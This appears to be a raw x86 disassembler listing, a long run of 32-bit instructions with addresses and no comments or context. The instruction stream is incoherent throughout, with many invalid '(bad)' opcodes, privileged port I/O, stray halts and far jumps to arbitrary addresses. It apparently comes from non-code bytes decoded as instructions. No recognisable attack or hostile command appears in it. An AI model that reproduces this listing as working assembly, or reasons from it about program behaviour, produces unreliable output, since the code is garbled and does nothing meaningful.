  408fd8:	push   ecx
  408fd9:	popa   
  408fda:	cmp    al,0xcd
  408fdc:	jecxz  0x409024
  408fde:	gs fcomi st,st(6)
  408fe1:	icebp  
  408fe2:	sub    DWORD PTR [ecx],edx
  408fe4:	and    dh,BYTE PTR [ebx+0xd]
  408fe7:	aam    0xf9
  408fe9:	jmp    0x8a9ccbf1
  408fee:	test   eax,0x6ecfb22b
  408ff3:	mov    ah,0x8a
  408ff5:	hlt    
  408ff6:	cmc    
  408ff7:	sahf   
  408ff8:	cli    
  408ff9:	or     al,0xe3
  408ffb:	cmp    BYTE PTR [edi+0xc05af20],bl
  409001:	cs mov ebx,esp
  409004:	xor    al,BYTE PTR [ecx]
  409006:	add    al,0x81
  409008:	or     BYTE PTR [eax-0x288a45e],bh
  40900e:	in     eax,0x75
  409010:	stos   DWORD PTR es:[edi],eax
  409011:	and    eax,0xd9013914
  409016:	xchg   esp,eax
  409017:	pop    esi
  409018:	ret    
  409019:	xor    eax,esi
  40901b:	and    ebx,0x3da8486c
  409021:	fcomp  DWORD PTR [edx-0x35]
  409024:	sbb    ah,bl
  409026:	xor    eax,DWORD PTR [ebx+0x6b]
  409029:	cmp    BYTE PTR [ecx],ch
  40902b:	push   edx
  40902c:	xlat   BYTE PTR ds:[ebx]
  40902d:	jp     0x409071
  40902f:	fcomp  QWORD PTR [ecx+0x28e075bd]
  409035:	stc    
  409036:	mov    cl,0x3f
  409038:	push   ebp
  409039:	and    DWORD PTR [edx+0x59581de5],eax
  40903f:	cmp    DWORD PTR [ecx],ebx
  409041:	js     0x409079
  409043:	add    al,0x72
  409045:	ins    BYTE PTR es:[edi],dx
  409046:	jo     0x40904e
  409048:	in     al,dx
  409049:	jne    0x4090a2
  40904b:	jmp    0x5fea209d
  409050:	xchg   esp,eax
  409051:	and    ebp,edi
  409053:	data16 and al,0xac
  409056:	loopne 0x409083
  409058:	pop    ss
  409059:	mov    bl,0x80
  40905b:	out    0x75,al
  40905d:	and    eax,0xdc198935
  409062:	pop    esi
  409063:	add    ebp,esi
  409065:	mov    ch,0x16
  409067:	mov    ds:0xdbfa97ea,eax
  40906c:	sar    BYTE PTR [ebx],1
  40906e:	out    0xa1,al
  409070:	pop    ss
  409071:	pop    ecx
  409072:	dec    ebp
  409073:	test   eax,0x346f84af
  409078:	fisubr WORD PTR [ebp+0x49]
  40907b:	pop    ecx
  40907c:	inc    edi
  40907d:	stos   DWORD PTR es:[edi],eax
  40907e:	cmp    BYTE PTR [ecx-0x20],bh
  409081:	scas   eax,DWORD PTR es:[edi]
  409082:	pop    eax
  409083:	cmp    DWORD PTR [eax+0x54],esp
  409086:	add    eax,0x4a3d6138
  40908b:	jg     0x409107
  40908d:	mov    dl,0x8d
  40908f:	bound  ecx,QWORD PTR ds:0x54dc6e82
  409095:	inc    esi
  409096:	mov    cl,0xa7
  409098:	sbb    al,0x38
  40909a:	daa    
  40909b:	fst    DWORD PTR [ecx-0x43b62f3f]
  4090a1:	xchg   ebp,eax
  4090a2:	outs   dx,BYTE PTR ds:[esi]
  4090a3:	sub    bl,BYTE PTR ds:0xd8efa147
  4090a9:	jae    0x4090b8
  4090ab:	cmp    DWORD PTR [esi],esi
  4090ad:	push   esi
  4090ae:	xor    BYTE PTR [eax],bl
  4090b0:	lahf   
  4090b1:	ins    DWORD PTR es:[edi],dx
  4090b2:	bound  edi,QWORD PTR [ecx-0x584b38ec]
  4090b8:	jne    0x4090c5
  4090ba:	or     cl,BYTE PTR [ebx+ebp*4+0x5d]
  4090be:	mov    cl,0x33
  4090c0:	pusha  
  4090c1:	ror    dh,0x44
  4090c4:	(bad)  
  4090c5:	sti    
  4090c6:	and    edi,0xffffffd0
  4090c9:	adc    eax,0x311da5a1
  4090ce:	inc    ebp
  4090cf:	mov    ebx,0x996f7772
  4090d4:	push   0xffffffa0
  4090d6:	dec    eax
  4090d7:	ds xchg ebp,eax
  4090d9:	fisubr WORD PTR [edx-0x2]
  4090dc:	iret   
  4090dd:	mov    BYTE PTR [ecx+0x6f7d4650],bl
  4090e3:	pop    ecx
  4090e4:	xor    bl,BYTE PTR [ebx-0x3978c93e]
  4090ea:	mov    WORD PTR [eax],?
  4090ec:	xchg   ebx,eax
  4090ed:	xor    al,dh
  4090ef:	sub    BYTE PTR [edi-0x13cdcefb],cl
  4090f5:	xor    eax,0x6c4df73
  4090fa:	cmp    ecx,DWORD PTR [ebp-0x6347ef4b]
  409100:	(bad)  
  409101:	clc    
  409102:	or     DWORD PTR [ecx],ebp
  409104:	jne    0x409177
  409106:	pop    es
  409107:	not    BYTE PTR [eax]
  409109:	repnz test ch,0x45
  40910d:	das    
  40910e:	pop    ebp
  40910f:	out    dx,eax
  409110:	call   0xc7ca8e5a
  409115:	jae    0x4090c9
  409117:	push   eax
  409118:	dec    ebx
  409119:	(bad)  
  40911a:	pop    edi
  40911b:	cmp    esi,edx
  40911d:	push   0x94e88c74
  409122:	sub    al,BYTE PTR [ecx]
  409124:	jp     0x4090f1
  409126:	outs   dx,BYTE PTR ds:[esi]
  409127:	add    eax,0xf5857391
  40912c:	std    
  40912d:	jno    0x409177
  40912f:	ds jno 0x4090be
  409132:	mov    esi,0xe01375bb
  409137:	jl     0x4090db
  409139:	mov    ebp,DWORD PTR [esi-0x1f]
  40913c:	sub    DWORD PTR [ebp-0x21],0x8
  409140:	jbe    0x409148
  409142:	pop    eax
  409143:	sbb    BYTE PTR ds:0xf787619,dh
  409149:	jns    0x409120
  40914b:	ret    
  40914c:	xchg   ebx,eax
  40914d:	xchg   BYTE PTR [edi+0x4a],dh
  409150:	call   FWORD PTR [edi+edx*1-0x13e7c9c7]
  409157:	enter  0xe348,0xb
  40915b:	imul   BYTE PTR [edx+0x5f]
  40915e:	(bad)  
  40915f:	out    0x18,eax
  409161:	cmp    al,bh
  409163:	sbb    BYTE PTR [ecx],0x67
  409166:	jg     0x40918d
  409168:	cmc    
  409169:	ds mov bl,0x2d
  40916c:	mov    ds:0x3194f2a1,eax
  409171:	cmp    BYTE PTR [edi],ch
  409173:	xor    bh,BYTE PTR [edx-0x35]
  409176:	sub    DWORD PTR [edi],edi
  409178:	and    al,0xaa
  40917a:	outs   dx,BYTE PTR ds:[esi]
  40917b:	mov    ebx,DWORD PTR [edx+0x26]
  40917e:	cmp    al,0x8f
  409180:	je     0x4091d1
  409182:	in     eax,dx
  409183:	cmp    BYTE PTR [esi],bl
  409185:	jbe    0x409140
  409187:	or     BYTE PTR [ecx],cl
  409189:	jl     0x4091ac
  40918b:	mov    ch,0xf5
  40918d:	xchg   ebx,eax
  40918e:	pusha  
  40918f:	sbb    bl,dh
  409191:	xor    DWORD PTR [esp+edx*8],0xedaa3100
  409198:	pop    ecx
  409199:	ret    
  40919a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40919b:	enter  0x9ecf,0xa0
  40919f:	pop    esp
  4091a0:	jb     0x4091b0
  4091a2:	outs   dx,BYTE PTR ds:[esi]
  4091a3:	jmp    0xe0a6:0xfe2ec5f2
  4091aa:	imul   esi,DWORD PTR [ebx],0x2c
  4091ad:	xlat   BYTE PTR ds:[ebx]
  4091ae:	pop    esp
  4091af:	scas   al,BYTE PTR es:[edi]
  4091b0:	xchg   edi,eax
  4091b1:	fisttp DWORD PTR [esi-0xd]
  4091b4:	dec    ebp
  4091b5:	add    eax,0x615a666e
  4091ba:	imul   esp,DWORD PTR [ebx],0x38a5b6fd
  4091c0:	cdq    
  4091c1:	mov    edx,0xd4a8eec8
  4091c6:	cmp    eax,0x2f2cf550
  4091cb:	cmp    BYTE PTR [edx+0x4c],bl
  4091ce:	push   ebp
  4091cf:	sar    edx,1
  4091d1:	cmp    ebx,edi
  4091d3:	sbb    BYTE PTR [edi-0x7a08d4eb],dl
  4091d9:	fld    TBYTE PTR [esi+0x0]
  4091dc:	ss cli 
  4091de:	inc    esp
  4091df:	mov    esi,0x1abc8e1d
  4091e4:	jp     0x409167
  4091e6:	xor    dh,al
  4091e8:	cmc    
  4091e9:	or     ebp,ecx
  4091eb:	or     ecx,ebx
  4091ed:	lea    ebp,[ebx+0x6eaabdd0]
  4091f3:	mov    ecx,0x591eb8a4
  4091f8:	rcl    DWORD PTR [eax],cl
  4091fa:	popa   
  4091fb:	cmp    DWORD PTR [eax+0x79c6784],ebp
  409201:	mov    ebp,0x5ae45316
  409206:	jo     0x4091b0
  409208:	jmp    0xbae8:0xafa5038
  40920f:	mov    BYTE PTR [ebp-0x3c3193c5],dh
  409215:	xchg   ebp,eax
  409216:	ins    DWORD PTR es:[edi],dx
  409217:	mov    ah,0x49
  409219:	sub    DWORD PTR [edi-0x47],ebp
  40921c:	jmp    0x1a:0x8e47e169
  409223:	cmp    DWORD PTR [ecx],ebp
  409225:	dec    esi
  409226:	(bad)  
  409227:	scas   al,BYTE PTR es:[edi]
  409228:	jns    0x4091f4
  40922a:	imul   edx,esp,0xee716d09
  409230:	aas    
  409231:	xor    DWORD PTR [edi+0x2f6bee4c],esi
  409237:	cmc    
  409238:	aas    
  409239:	icebp  
  40923a:	inc    eax
  40923b:	cmp    DWORD PTR [edx-0x68737683],edx
  409241:	xor    al,0xc9
  409243:	add    dh,ch
  409245:	test   al,0x17
  409247:	imul   esp,DWORD PTR gs:[edi+0x1b857cc],0x38295a93
  409252:	mov    dl,BYTE PTR [esi+0x605b8422]
  409258:	neg    BYTE PTR [eax+0x7b]
  40925b:	test   al,0xa7
  40925d:	(bad)  
  40925e:	push   edi
  40925f:	fadd   DWORD PTR cs:[ebx+0x3b9e23a9]
  409266:	and    BYTE PTR [eax-0x16a79473],0x2f
  40926d:	shr    BYTE PTR [ecx-0x1b],0x8
  409271:	cmp    ebp,esi
  409273:	xor    al,0x9a
  409275:	cmp    ecx,eax
  409277:	in     eax,dx
  409278:	lods   al,BYTE PTR ds:[esi]
  409279:	xchg   ecx,eax
  40927a:	mov    ebp,0x6e1e9bdc
  40927f:	retf   
  409280:	mov    al,0xbd
  409282:	stos   BYTE PTR es:[edi],al
  409283:	add    al,0xf7
  409285:	scas   eax,DWORD PTR es:[edi]
  409286:	ins    BYTE PTR es:[edi],dx
  409287:	in     eax,0xae
  409289:	ss jecxz 0x4092c4
  40928c:	nop
  40928d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40928e:	cmc    
  40928f:	shl    DWORD PTR [esi-0xa911bf2],1
  409295:	inc    ebp
  409296:	enter  0x36e0,0x41
  40929a:	and    al,0xe2
  40929c:	jmp    0x8c5f4cde
  4092a1:	push   ds
  4092a2:	jo     0x409282
  4092a4:	stc    
  4092a5:	jp     0x409245
  4092a7:	cmp    bl,BYTE PTR [edi-0xa176725]
  4092ad:	(bad)  
  4092ae:	call   0x1ac86f76
  4092b3:	sub    DWORD PTR [edi-0x7fd545d0],ebp
  4092b9:	repnz (bad) 
  4092bb:	dec    eax
  4092bc:	xor    bl,cl
  4092be:	ret    
  4092bf:	shl    al,1
  4092c1:	push   ss
  4092c2:	lock mov ds:0x3b8d380a,eax
  4092c8:	xor    bh,BYTE PTR [ebx]
  4092ca:	adc    ebx,DWORD PTR [eax]
  4092cc:	(bad)  
  4092cd:	jecxz  0x409287
  4092cf:	add    al,0xf7
  4092d1:	cdq    
  4092d2:	neg    DWORD PTR [esi+0x1faeec84]
  4092d8:	jnp    0x4092c8
  4092da:	outs   dx,BYTE PTR ds:[esi]
  4092db:	pop    ds
  4092dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092dd:	rol    BYTE PTR [ecx+0x69b25100],cl
  4092e3:	cmp    BYTE PTR [ebx+edx*2],ch
  4092e6:	push   esi
  4092e7:	aas    
  4092e8:	dec    edx
  4092e9:	pop    eax
  4092ea:	retf   
  4092eb:	mov    edi,0x35a27df5
  4092f0:	retf   
  4092f1:	repnz ins DWORD PTR es:[edi],dx
  4092f3:	es jnp 0x4092ea
  4092f6:	xor    DWORD PTR [edi],ebx
  4092f8:	cmc    
  4092f9:	stos   BYTE PTR es:[edi],al
  4092fa:	test   eax,0xed64cf51
  4092ff:	sub    ebp,esi
  409301:	dec    esi
  409302:	push   ebx
  409303:	pop    esp
  409304:	jo     0x4092c9
  409306:	cmp    eax,0xb23bc7bd
  40930b:	mov    ebx,0x6cc2ba0b
  409310:	cli    
  409311:	sub    DWORD PTR [edi-0x38],ebp
  409314:	dec    ebx
  409315:	loop   0x4092e7
  409317:	push   0x467192c
  40931c:	fld    QWORD PTR [ebp-0x11]
  40931f:	or     BYTE PTR [esi+0x2a],0xb1
  409323:	ret    0x535
  409326:	xchg   BYTE PTR [edx-0x5a],al
  409329:	xor    BYTE PTR [edx-0x53e6a643],cl
  40932f:	(bad)  
  409330:	popa   
  409331:	mov    eax,0x293b3da1
  409336:	mov    edi,0x3305f5bf
  40933b:	xor    BYTE PTR [ebx-0x135f32b1],0x3b
  409342:	scas   al,BYTE PTR es:[edi]
  409343:	sti    
  409344:	sub    eax,0x12aed669
  409349:	and    al,0x4b
  40934b:	xor    ch,0xac
  40934e:	pusha  
  40934f:	popf   
  409350:	loope  0x409310
  409352:	add    eax,0x73bd248
  409357:	not    BYTE PTR [edi+eax*2-0x3158c677]
  40935e:	outs   dx,BYTE PTR ds:[esi]
  40935f:	std    
  409360:	hlt    
  409361:	lea    esi,[edx]
  409363:	adc    ecx,DWORD PTR ds:0xc4c6cb33
  409369:	cmp    esp,esi
  40936b:	jmp    0x6cba:0xbf2f1b79
  409372:	outs   dx,DWORD PTR ds:[esi]
  409373:	outs   dx,DWORD PTR ds:[esi]
  409374:	lods   al,BYTE PTR ds:[esi]
  409375:	lods   eax,DWORD PTR es:[esi]
  409377:	jmp    0x20b9b89
  40937c:	mov    al,ds:0xa84fee0e
  409381:	ret    0xc285
  409384:	(bad)  
  409385:	mov    dx,ss
  409388:	loopne 0x409387
  40938a:	scas   al,BYTE PTR es:[edi]
  40938b:	jno    0x409372
  40938d:	repnz pop eax
  40938f:	jns    0x4093f7
  409391:	cmp    BYTE PTR [eax],bh
  409393:	xor    eax,0x60911a20
  409398:	push   cs
  409399:	push   ds
  40939a:	outs   dx,BYTE PTR ds:[esi]
  40939b:	iret   
  40939c:	pop    ebp
  40939d:	mov    ecx,0xafb3d7b6
  4093a2:	mov    ds:0xc599a433,al
  4093a7:	in     al,0x1f
  4093a9:	mov    BYTE PTR [ecx],ah
  4093ab:	ja     0x40936e
  4093ad:	nop
  4093ae:	js     0x4093dd
  4093b0:	xchg   esi,eax
  4093b1:	jb     0x409422
  4093b3:	jne    0x409356
  4093b5:	sbb    BYTE PTR [eax],bl
  4093b7:	fdiv   QWORD PTR [ecx+0x4718ed3c]
  4093bd:	out    dx,al
  4093be:	dec    ebp
  4093bf:	imul   esp,DWORD PTR [esi+0x766d43c6],0x20
  4093c6:	jge    0x40940e
  4093c8:	sbb    esi,DWORD PTR [ebx]
  4093ca:	clc    
  4093cb:	stc    
  4093cc:	cmp    eax,0xddd4a812
  4093d1:	mov    esp,DWORD PTR [ecx+0xc000038]
  4093d7:	jle    0x4093af
  4093d9:	aas    
  4093da:	push   ecx
  4093db:	push   ebp
  4093dc:	cmc    
  4093dd:	cmp    eax,0x67bcbb2a
  4093e2:	jne    0x4093b6
  4093e4:	sub    bh,BYTE PTR [eax]
  4093e6:	cld    
  4093e7:	aaa    
  4093e8:	mov    ah,0x17
  4093ea:	outs   dx,DWORD PTR ds:[esi]
  4093eb:	jb     0x4093a2
  4093ed:	jne    0x40945e
  4093ef:	or     al,0xa4
  4093f1:	mov    ds:0x5f37ffc4,eax
  4093f6:	stos   DWORD PTR es:[edi],eax
  4093f7:	cmp    BYTE PTR [eax+0x59492476],bh
  4093fd:	das    
  4093fe:	dec    ecx
  4093ff:	daa    
  409400:	call   0xcf6f8e70
  409405:	test   al,0x28
  409407:	xchg   al,ch
  409409:	cmp    BYTE PTR [esi],0xcb
  40940c:	fdivr  DWORD PTR [edx]
  40940e:	rol    DWORD PTR [ebx-0x294561ec],cl
  409414:	jp     0x409492
  409416:	fistp  QWORD PTR [edi-0xb]
  409419:	(bad)  
  40941a:	mov    ebx,DWORD PTR [esi]
  40941c:	push   ds
  40941d:	fld    QWORD PTR [ebp+0x573869f2]
  409423:	out    dx,al
  409424:	dec    ecx
  409425:	xchg   ecx,eax
  409426:	ins    DWORD PTR es:[edi],dx
  409427:	js     0x409450
  409429:	imul   BYTE PTR [esi-0x31]
  40942c:	push   0x46
  40942e:	sub    al,ch
  409430:	jle    0x40948c
  409432:	mov    DWORD PTR [ecx],edi
  409434:	jmp    0x40940d
  409436:	mov    bh,BYTE PTR [edi-0x50]
  409439:	(bad)  
  40943b:	sbb    BYTE PTR [edi-0x7c8b5941],dl
  409441:	out    0x55,eax
  409443:	mov    ecx,0x9c084ec1
  409448:	dec    ecx
  409449:	xor    dl,BYTE PTR [ecx+edi*1]
  40944c:	loopne 0x4093f4
  40944e:	scas   eax,DWORD PTR es:[edi]
  40944f:	inc    ebx
  409450:	sub    DWORD PTR [ebp+ecx*2+0x35d7f56e],edx
  409457:	jb     0x40948e
  409459:	xchg   esi,eax
  40945a:	icebp  
  40945b:	and    BYTE PTR [ecx-0x610869f8],ch
  409461:	pop    edi
  409462:	scas   eax,DWORD PTR es:[edi]
  409463:	cwde   
  409464:	mov    esp,0xae2edcbc
  409469:	retf   
  40946a:	test   al,0xb9
  40946c:	pop    ebp
  40946d:	pushf  
  40946e:	lods   eax,DWORD PTR ds:[esi]
  40946f:	cli    
  409470:	leave  
  409471:	repnz aad 0x2a
  409474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409475:	js     0x40946e
  409477:	(bad)  
  409478:	call   0x859cc7e6
  40947d:	and    al,0x29
  40947f:	cs in  al,dx
  409481:	pop    edi
  409482:	fsub   st,st(0)
  409484:	mov    edi,0xac334ebf
  409489:	dec    esp
  40948a:	jb     0x4094b7
  40948c:	cld    
  40948d:	mov    ch,0x8b
  40948f:	sub    al,BYTE PTR [ebx]
  409491:	mov    cl,BYTE PTR [esi+0x67]
  409494:	mov    dl,0xdf
  409496:	out    dx,al
  409497:	sbb    bh,BYTE PTR [esi+0x6a]
  40949a:	outs   dx,DWORD PTR ds:[esi]
  40949b:	fidiv  DWORD PTR [ebx]
  40949d:	and    eax,0xe347d264
  4094a2:	adc    al,BYTE PTR [ecx+0x42]
  4094a5:	pop    es
  4094a6:	mov    eax,ds:0x4c381772
  4094ab:	shl    DWORD PTR ds:0xec06effa,cl
  4094b1:	adc    eax,0xbc77fc2e
  4094b6:	pushf  
  4094b7:	cmp    BYTE PTR [ecx-0x8f7beb9],dl
  4094bd:	cmp    BYTE PTR [edi-0xe9d273c],al
  4094c3:	add    eax,0xc76eb29e
  4094c8:	mov    eax,0x6935db25
  4094cd:	xor    DWORD PTR [esi],esi
  4094cf:	cmp    al,0x44
  4094d1:	cli    
  4094d2:	sbb    eax,0xfbf6fc9
  4094d7:	out    0x64,eax
  4094d9:	sub    BYTE PTR [esi-0x5e5429a0],ah
  4094df:	and    ebp,esi
  4094e1:	cdq    
  4094e2:	mov    al,ds:0xc90b436d
  4094e7:	call   0xca47:0xcc853ba4
  4094ee:	xchg   ebx,eax
  4094ef:	xor    al,0x8c
  4094f1:	jle    0x4094f2
  4094f3:	sbb    eax,0xd26f2f65
  4094f8:	jge    0x4094ce
  4094fa:	inc    ecx
  4094fb:	push   edx
  4094fc:	(bad)  
  4094fd:	xchg   esi,eax
  4094fe:	test   eax,0xd3ccd638
  409503:	mov    edx,0x23449d9b
  409508:	idiv   BYTE PTR [ebx-0x39]
  40950b:	shr    DWORD PTR ds:0xc19a8514,0x3c
  409512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409513:	cmp    ah,bh
  409515:	in     al,dx
  409516:	nop
  409517:	xchg   ebx,eax
  409518:	push   esp
  409519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951b:	xchg   edx,eax
  40951c:	js     0x4094c7
  40951e:	mov    dl,0x6c
  409520:	xchg   ecx,eax
  409521:	cmp    edi,ebx
  409523:	mov    ecx,0x69205970
  409528:	sahf   
  409529:	cmp    ah,BYTE PTR [eax+0x75c90bbc]
  40952f:	stos   BYTE PTR es:[edi],al
  409530:	dec    eax
  409531:	sub    al,0x88
  409533:	bound  edx,QWORD PTR [edx]
  409535:	stc    
  409536:	retf   0x689f
  409539:	sub    ecx,DWORD PTR [edx-0x22]
  40953c:	adc    BYTE PTR [eax+0x79],bl
  40953f:	push   cs
  409540:	js     0x40957a
  409542:	jb     0x409514
  409544:	sbb    eax,esi
  409546:	mov    al,0x12
  409548:	sub    al,dh
  40954a:	outs   dx,BYTE PTR ds:[esi]
  40954b:	xor    BYTE PTR [esp+ecx*2],cl
  40954e:	out    dx,al
  40954f:	(bad)  
  409550:	scas   eax,DWORD PTR es:[edi]
  409551:	push   0x8b45392f
  409556:	sbb    eax,DWORD PTR [edx+esi*2-0x972d6c9]
  40955d:	aas    
  40955e:	pushf  
  40955f:	into   
  409560:	ins    DWORD PTR es:[edi],dx
  409561:	push   ebp
  409562:	ror    BYTE PTR [esi],cl
  409564:	mov    ch,0xc5
  409566:	or     al,0x30
  409568:	ret    0x7ecb
  40956b:	pop    ds
  40956c:	sub    edi,eax
  40956e:	ret    0xaa12
  409571:	outs   dx,WORD PTR ds:[esi]
  409573:	pop    esp
  409574:	fdiv   QWORD PTR [eax-0x66]
  409577:	sbb    DWORD PTR [ecx-0x17c6ae7b],0x7915d9b9
  409581:	call   0x173690d9
  409586:	xor    BYTE PTR [ebx+eiz*1+0x49401c06],dh
  40958d:	or     DWORD PTR [edi+eiz*2-0x53d1f3ad],esi
  409594:	inc    edi
  409595:	enter  0x3cfa,0xf5
  409599:	fldcw  WORD PTR [esi+0x7d619dfa]
  40959f:	push   esi
  4095a0:	lahf   
  4095a1:	cmp    eax,DWORD PTR [ebx+0x4e375d5e]
  4095a7:	out    dx,eax
  4095a8:	sbb    esp,DWORD PTR [eax+0x6732666e]
  4095ae:	out    0x6a,al
  4095b0:	scas   eax,DWORD PTR es:[edi]
  4095b1:	cmp    eax,0xba4b38ab
  4095b6:	mov    eax,ds:0x701116a8
  4095bb:	sbb    dh,ch
  4095bd:	add    bl,BYTE PTR [eax]
  4095bf:	jle    0x40961a
  4095c1:	jle    0x4095d6
  4095c3:	sbb    bh,al
  4095c5:	sbb    DWORD PTR [ecx-0x13443a97],edx
  4095cb:	fisttp QWORD PTR [ecx-0x3ab7d768]
  4095d1:	pop    es
  4095d2:	mov    ds:0x32bbb1cf,al
  4095d7:	xchg   ebp,eax
  4095d8:	loop   0x4095aa
  4095da:	inc    ecx
  4095db:	pop    ecx
  4095dc:	jno    0x4095a6
  4095de:	xchg   ebx,eax
  4095df:	mov    esp,0x692f00d4
  4095e4:	jecxz  0x4095ea
  4095e6:	scas   al,BYTE PTR es:[edi]
  4095e7:	push   0x39
  4095e9:	mov    ecx,DWORD PTR [esi-0x1e]
  4095ec:	and    eax,0xf51cc13c
  4095f1:	and    esi,DWORD PTR [esi-0x70]
  4095f4:	dec    ecx
  4095f5:	push   0xa553b4f7
  4095fa:	sbb    BYTE PTR [ecx],bh
  4095fc:	out    dx,al
  4095fd:	ror    BYTE PTR [edx],0xd6
  409600:	xchg   esp,eax
  409601:	scas   eax,DWORD PTR es:[edi]
  409602:	shl    BYTE PTR [ebx+0x7963ef5],0x7f
  409609:	xchg   BYTE PTR [esi+0x7238285c],ah
  40960f:	jo     0x409621
  409611:	enter  0xf760,0x50
  409615:	mov    al,0x6e
  409617:	fwait
  409618:	std    
  409619:	call   ebp
  40961b:	test   BYTE PTR [edx-0x58],ah
  40961e:	push   ecx
  40961f:	cmp    DWORD PTR [ebx],ecx
  409621:	dec    esi
  409622:	xor    BYTE PTR [ecx+eax*8-0xa5b9d32],0xee
  40962a:	xchg   ecx,eax
  40962b:	div    BYTE PTR [ecx]
  40962d:	(bad)  [edx-0x3]
  409630:	xlat   BYTE PTR ds:[ebx]
  409631:	cmp    ebx,DWORD PTR [esi]
  409633:	ret    
  409634:	push   ebp
  409635:	shr    esi,cl
  409637:	(bad)  
  409638:	mov    WORD PTR [edx],cs
  40963a:	outs   dx,BYTE PTR fs:[esi]
  40963c:	sbb    al,0x3a
  40963e:	in     eax,dx
  40963f:	add    al,0xf5
  409641:	pop    esi
  409642:	lahf   
  409643:	jns    0x409678
  409645:	scas   al,BYTE PTR es:[edi]
  409646:	dec    ebp
  409647:	cmp    al,ch
  409649:	stos   BYTE PTR es:[edi],al
  40964a:	pop    esi
  40964b:	cmp    DWORD PTR [ecx],ebp
  40964d:	jno    0x409681
  40964f:	jmp    0x6a59ec2c
  409654:	jnp    0x4095db
  409656:	push   esp
  409657:	mov    edi,0x3357a9f5
  40965c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40965d:	xlat   BYTE PTR ds:[ebx]
  40965e:	adc    BYTE PTR [eax],dh
  409660:	(bad)  
  409661:	push   ecx
  409662:	mov    BYTE PTR [edi+ecx*2+0x38],dl
  409666:	jecxz  0x409667
  409668:	mov    edi,0x378cd909
  40966d:	sahf   
  40966e:	outs   dx,DWORD PTR ds:[esi]
  40966f:	pop    esp
  409670:	popf   
  409671:	das    
  409672:	fwait
  409673:	dec    eax
  409674:	test   eax,0x7c5f5235
  409679:	jno    0x409620
  40967b:	push   ebx
  40967c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40967d:	jl     0x40966f
  40967f:	mov    WORD PTR [ebp-0xa1484e3],?
  409685:	fwait
  409686:	ins    DWORD PTR es:[edi],dx
  409687:	ds (bad) 
  409689:	mov    ds:0x3b95e4a1,al
  40968e:	fwait
  40968f:	retf   0x7c8c
  409692:	jmp    0x409625
  409694:	sub    al,0xa4
  409696:	outs   dx,BYTE PTR ds:[esi]
  409697:	pop    ecx
  409698:	stos   BYTE PTR es:[edi],al
  409699:	mov    esi,0x1273b37
  40969e:	fistp  QWORD PTR [eax]
  4096a0:	int    0xdd
  4096a2:	fwait
  4096a3:	rcr    DWORD PTR [edx+ebp*2+0x7],cl
  4096a7:	inc    ebx
  4096a8:	call   0xb9ff019f
  4096ad:	mov    ds:0x140d98e2,eax
  4096b2:	jge    0x4096ec
  4096b4:	pushf  
  4096b5:	out    0x69,al
  4096b7:	jmp    0x4096ff
  4096b9:	dec    esi
  4096ba:	ds push ebx
  4096bc:	and    eax,0xf78f3fae
  4096c1:	mov    ebp,0x64c8a47a
  4096c6:	pop    esp
  4096c7:	mov    ecx,0x1b2e119c
  4096cc:	push   ss
  4096cd:	cmp    edi,esi
  4096cf:	sub    DWORD PTR [edx+0xce6d4c4],edx
  4096d5:	and    BYTE PTR ds:0x4905300c,bh
  4096db:	mov    ecx,0xb2b39d34
  4096e0:	push   esp
  4096e1:	push   edx
  4096e2:	jmp    0x40971c
  4096e4:	repnz aaa 
  4096e6:	jnp    0x40968b
  4096e8:	mov    ebx,0x1d6b5d01
  4096ed:	pushf  
  4096ee:	xor    eax,0x395a9271
  4096f4:	or     al,al
  4096f6:	mov    bh,ch
  4096f8:	mov    ds,WORD PTR [ebp+0x46f57048]
  4096fe:	rcr    ah,1
  409700:	cmp    DWORD PTR gs:[ecx-0x53],eax
  409704:	xchg   esp,eax
  409705:	cmp    eax,DWORD PTR [ebp-0x23b1a2ed]
  40970b:	sbb    DWORD PTR [ebx],eax
  40970d:	fldcw  WORD PTR [esi+0x73]
  409710:	int3   
  409711:	out    0x93,eax
  409713:	pop    ebx
  409714:	mov    bh,0xf4
  409716:	dec    ebx
  409717:	cmp    DWORD PTR ds:0xbc8a0f91,ebx
  40971d:	or     BYTE PTR [eax],ah
  40971f:	test   ch,dh
  409721:	and    esi,DWORD PTR [esi-0x3e2cf85a]
  409727:	mov    ebp,0x38c92f93
  40972c:	and    ah,cl
  40972e:	stos   BYTE PTR es:[edi],al
  40972f:	test   cl,bl
  409731:	jg     0x40974f
  409733:	adc    BYTE PTR [edi-0x3a],bh
  409736:	lea    edi,[edx+0x1d6ee348]
  40973c:	daa    
  40973d:	mov    ds:0x38303e9f,eax
  409742:	test   DWORD PTR [ecx],edx
  409744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409745:	jae    0x4096d0
  409747:	cwde   
  409748:	and    bl,BYTE PTR [edx+0x6f]
  40974b:	into   
  40974c:	dec    edi
  40974d:	xchg   edx,eax
  40974e:	xor    dh,bl
  409750:	retf   
  409751:	jg     0x40976d
  409753:	das    
  409754:	jge    0x409730
  409756:	sahf   
  409757:	cmp    dh,cl
  409759:	xlat   BYTE PTR ds:[ebx]
  40975a:	jle    0x4097d3
  40975c:	(bad)  
  40975d:	shr    BYTE PTR [esi+0x63],cl
  409760:	scas   al,BYTE PTR es:[edi]
  409761:	mov    DWORD PTR [edx+0x10a49dc8],edx
  409767:	cmp    DWORD PTR [edx-0x2951e680],ecx
  40976d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40976e:	push   0xe005f560
  409773:	jb     0x40977f
  409775:	je     0x40972f
  409777:	bound  edi,QWORD PTR [edi]
  409779:	sbb    ebp,esi
  40977b:	inc    ebx
  40977c:	cmp    BYTE PTR [ebx-0x79],0x5e
  409780:	pop    edx
  409781:	rcr    cl,0x10
  409784:	cmc    
  409785:	jb     0x40970f
  409787:	es inc edi
  409789:	js     0x40978e
  40978b:	add    ebp,DWORD PTR [edi]
  40978d:	cmp    eax,0x6f9096a0
  409792:	mov    dh,BYTE PTR [edx]
  409794:	int    0xf3
  409796:	test   al,0x5a
  409798:	cmc    
  409799:	mov    ds:0x8886e6bc,al
  40979e:	imul   esi,ecx,0xffffffe5
